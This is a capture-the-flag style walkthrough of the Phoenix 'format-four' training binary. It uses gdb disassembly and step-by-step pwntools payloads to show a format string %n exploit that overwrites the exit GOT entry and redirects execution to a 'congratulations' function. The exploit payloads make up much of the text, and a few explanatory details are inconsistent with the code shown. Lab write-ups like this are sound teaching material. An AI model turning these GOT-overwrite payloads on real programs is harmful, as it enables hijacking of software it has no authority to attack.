## Quick Overview

Similar to [Format Three Writeup](https://shivasurya.me/security/binary-exploit/reverse-engineering/friday-gems/2023/04/14/exploit-education-format-three-exercise-writeup.html), Format Four exercise motives are smashing the stack, overwrite arbitrary memory address and execute `congratulations` function within the program. However, this Format Four challenge revolves around [`Format String Vulnerability`](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/) and quite challenging when exploiting in 64-bit architecture binary.

## Disassemble

Disassembling the code will get you overall idea behind the format-four code, One can use `gdb ./format-four` to start debugging it in runtime.

1. `gdb ./format-four`
2. Type `disassemble main` to get the disassembled code (assembly)

```assembly
   0x08048523 <+0>:     lea    ecx,[esp+0x4]
   0x08048527 <+4>:     and    esp,0xfffffff0
   0x0804852a <+7>:     push   DWORD PTR [ecx-0x4]
   0x0804852d <+10>:    push   ebp
   0x0804852e <+11>:    mov    ebp,esp
   0x08048530 <+13>:    push   ecx
   0x08048531 <+14>:    sub    esp,0x1004
   0x08048537 <+20>:    sub    esp,0xc
   0x0804853a <+23>:    push   0x8048600
   0x0804853f <+28>:    call   0x8048310 <puts@plt>
   0x08048544 <+33>:    add    esp,0x10
   0x08048547 <+36>:    sub    esp,0x4
   0x0804854a <+39>:    push   0xfff
   0x0804854f <+44>:    lea    eax,[ebp-0x1008]
   0x08048555 <+50>:    push   eax
   0x08048556 <+51>:    push   0x0
   0x08048558 <+53>:    call   0x8048320 <read@plt>
   0x0804855d <+58>:    add    esp,0x10
   0x08048560 <+61>:    test   eax,eax
   0x08048562 <+63>:    jg     0x804856e <main+75>
   0x08048564 <+65>:    sub    esp,0xc
   0x08048567 <+68>:    push   0x1
   0x08048569 <+70>:    call   0x8048330 <exit@plt>
   0x0804856e <+75>:    sub    esp,0xc
   0x08048571 <+78>:    lea    eax,[ebp-0x1008]
   0x08048577 <+84>:    push   eax
   0x08048578 <+85>:    call   0x80484e5 <bounce>
   0x0804857d <+90>:    add    esp,0x10
   0x08048580 <+93>:    mov    eax,0x0
   0x08048585 <+98>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048588 <+101>:   leave
   0x08048589 <+102>:   lea    esp,[ecx-0x4]
   0x0804858c <+105>:   ret
```

Before taking a look at the code, if you disassembled the format-four using gdb to view the assembly instruction, you may notice the puts, fgets, sprintf function calls with parameters. So basically when you hit `r` in gdb without breakpoint,

1. Greet with `Welcome to phoenix/format-four, brought to you by https://exploit.education` message via Puts (aka printf) method
2. The `bounce` function takes a character pointer `str` as an argument, prints the string pointed to by `str`, and exits the program with a status of 0.
3. The `congratulations` function prints a message indicating that the user has successfully redirected code execution and exits the program with a status of 0.
4. The `main` function starts by declaring a character array `buf` with a size of 4096 bytes.
5. The `printf` function is called to print the value of the `BANNER` macro, which is defined earlier in the code.
6. The `read` function is called to read data from the standard input (file descriptor 0) into the `buf` array. The number of bytes read is limited to one less than the size of the `buf` array to ensure that there is room for a null terminator at the end of the string.
7. If the `read` function returns a value less than or equal to 0, indicating that an error occurred or no data was read, the program exits with a failure status.
8. Otherwise, the `bounce` function is called with `buf` as an argument.


## Memory Allocation - Exploit Strategy

There is no way you could overflow buffer overflow variable and overwrite any function pointer in the memory. However, introducing `%n` format modifier string can perform this magic by overwriting the address using `format string vulnerability`. 

 Our first step is to print "AAAA" temporarily and find the padding where it gets stored in the stack memory. We can start our exploration with couple of %x which helps in printing the address of the stack,
 
```shell
user@phoenix-amd64:/opt/phoenix/i486$ /opt/phoenix/i486/format-four $'AAAA%x.%x.\n'
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAAffffd8ca.100.
Better luck next time!
```
Our experiment continues untill we find `AAAA` or 41414141 in the stack and eventually we come to know that it occurs at the 11th padding,

```shell
user@phoenix-amd64:/opt/phoenix/i486$ ./format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAA0.0.0.f7f81cf7.f7ffb000.ffffd748.804857d.ffffc740.ffffc740.fff.0.41414141
```

Now that we found the padding, it's time to find the exact memory address of `congratulation` function. For 64-bit binary `format-four` it should be `0x400644` and 32-bit binary should be `0x08049868`. While performing the exploit, I personally found 64-bit arch challenging due to few reasons discussed in the next section.

```shell
user@phoenix-amd64:/opt/phoenix/i486$ nm format-four | grep congratulations
08048503 T congratulations
user@phoenix-amd64:/opt/phoenix/i486$
```

So, let's come up with a payload for 32-bit arch format-four binary first, However, we might require a redirection to `congratulations` function and `exit` function at `0x080497e4` address might be perfect candidate for this.

Since, `congratulation` now requires to be `0x08048503` which is pretty huge number and I don't think we have enough bytes to overwrite the memory address. However, there is a workaround by spliting the address into 4 bytes (32 Bit platform) and each byte gets a specific number of junk bytes to overwrite. For example, `\x44\x98\x04\x08` can try writing `45` first and carry forward to next bytes if any overflow.

1. One can start overwriting single byte with trial and error method, starting `changeme+0` with padding 11 yields. We could write some junk characters and bump the padding to `178` and try again. (this is purely based on trial and error method) and our result yields `0x103` which is our target comparing `0x08048503`.

```python
from pwn import *

exit = 0x080497e4
congratulations = 0x08048503

buff= ""
buff += p32(exit+0)
buff += p32(exit+1)
buff += p32(exit+2)
buff += p32(exit+3)

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 178       # JUNK
buff += "%n"            # write to first byte

print(buff)
```

```shell
(gdb) x 0x080497e4
0x80497e4 <exit@got.plt>:       0x00000103
```

2. When `changeme+1` is getting overwritten as `0x00000103` but our target is now `0x00008503` matching `0x08048503`. We could try pushing few more junk characters and bump `0x1` to `0x85`. So, we now require `0x85` - `0x1` i.e in decimal 132 characters to be written (including `%n`)

```python
from pwn import *

exit = 0x080497e4
congratulations = 0x08048503

buff= ""
buff += p32(exit+0)
buff += p32(exit+1)
buff += p32(exit+2)
buff += p32(exit+3)

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 178       # JUNK
buff += "%n"            # write to first byte

buff += 'A' * 130       # JUNK
buff += "%n"            # write to second byte

print(buff)
```

iterating the same process for `changeme+2` and `changeme+3` yields the following payload,

```python
from pwn import *

exit = 0x080497e4
congratulations = 0x08048503

buff= ""
buff += p32(exit+0)
buff += p32(exit+1)
buff += p32(exit+2)
buff += p32(exit+3)

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 178       # JUNK
buff += "%n"            # write to first byte

buff += 'A' * 130       # JUNK
buff += "%n"            # write to second byte

buff += 'A' * 127       # JUNK
buff += "%n"            # write to third byte

buff += 'A' * 4         # JUNK
buff += "%n"            # write to forth byte

print(buff)
```

## Challenge faced while exploiting 64-bit binary

As mentioned above while going through memory address of `congratulations` function in the stack of 64-bit binary should be `0x400644` and it contains unreasonable characters 😥 - `\x00` null character which is interpreted by the `strncpy` function and completely terminates the argument while copying to the buffer.

```shell
user@phoenix-amd64:/opt/phoenix/amd64$ ./format-four
Welcome to phoenix/format-four, brought to you by https://exploit.education
AAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x

user@phoenix-amd64:/opt/phoenix/amd64$ nm format-four | grep congratulations
0000000000400644 T congratulations
```

However, there might be better strategy to overcome this issue by altering environment variables that may push the address or placing the address to the end of the string in payload.

## Exploit

Now, our strategy should be,

1. Input `format string` as above python file execution results pipe-ing to `format-four` binary 
2. Now, `exit` memory address from GOT (Global Offset Table) is overwritten by `congratulations` address.

```shell
Welcome to phoenix/format-four, brought to you by https://exploit.education
����0 0 0 f7f81cf7 f7ffb000 ffffd718 804857d ffffc710 ffffc710 fff 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Well done, you're redirected code execution!
Well done, you're redirected code execution!
```

There you go! 🎉 You've officially `pwned` and you may eventually gain code execution in upcoming blog post dedicated for this `format-four` 🪲
